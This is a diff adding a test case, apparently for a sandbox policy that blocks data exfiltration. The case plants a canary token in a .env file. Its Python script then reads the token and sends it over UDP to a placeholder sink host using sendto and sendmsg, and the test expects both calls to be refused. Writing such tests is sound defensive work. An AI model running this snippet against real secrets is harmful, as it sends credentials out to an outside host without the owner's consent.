@@ -1,0 +1,31 @@
+# Datagrams carry the destination in the call itself. Both sendto and sendmsg
+# name an external peer after the secret was read, so both must be refused.
+name = "udp-datagram-exfil"
+kind = "attack"
+policy = "recommended"
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "udp.py"
+contents = """
+import socket
+secret = open(".env", "rb").read()
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+for send in [lambda: s.sendto(secret, ("{SINK_HOST}", {SINK_PORT})),
+             lambda: s.sendmsg([secret], [], 0, ("{SINK_HOST}", {SINK_PORT}))]:
+    try:
+        send()
+    except PermissionError:
+        pass
+"""
+
+[[steps]]
+shell = 0
+run = "python3 udp.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
